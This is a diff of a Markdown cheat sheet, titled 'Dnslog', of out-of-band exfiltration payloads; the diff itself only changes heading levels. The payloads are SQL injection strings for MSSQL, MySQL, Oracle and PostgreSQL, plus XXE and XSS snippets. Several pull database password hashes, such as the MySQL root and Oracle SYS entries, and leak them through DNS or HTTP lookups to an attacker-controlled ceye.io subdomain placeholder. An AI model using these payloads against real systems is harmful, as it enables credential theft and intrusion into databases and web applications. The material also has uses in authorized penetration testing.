@@ -1,4 +1,6 @@
-# mssql
+# Dnslog
+
+## mssql
 ```sql
 DECLARE @host varchar(1024);
 SELECT @host=(SELECT TOP 1
@@ -9,12 +11,12 @@ EXEC('master..xp_dirtree
 "\\'+@host+'\foobar$"');
 ```
 
-# mysql
+## mysql
 ```sql
 SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.<你的>.ceye.io\\abc'));
 ```
 
-# Oracle
+## Oracle
 ```sql
 SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.<你的>.ceye.io');
 SELECT UTL_HTTP.REQUEST('http://ip.port.<你的>.ceye.io/oracle') FROM DUAL;
@@ -23,7 +25,7 @@ SELECT DBMS_LDAP.INIT(('oracle.ip.port.<你的>.ceye.io',80) FROM DUAL;
 SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.<你的>.ceye.io',80) FROM DUAL;
 ```
 
-# PostgreSQL
+## PostgreSQL
 ```sql
 DROP TABLE IF EXISTS table_output;
 CREATE TABLE table_output(content text);
@@ -42,7 +44,7 @@ $ LANGUAGE plpgsql SECURITY DEFINER;
 SELECT temp_function();
 ```
 
-# XXE
+## XXE
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -51,7 +53,7 @@ SELECT temp_function();
 <root/>
 ```
 
-# XSS
+## XSS
 ```html
 <img src=x onerror=http://<你的>.ceye.io>
 ```
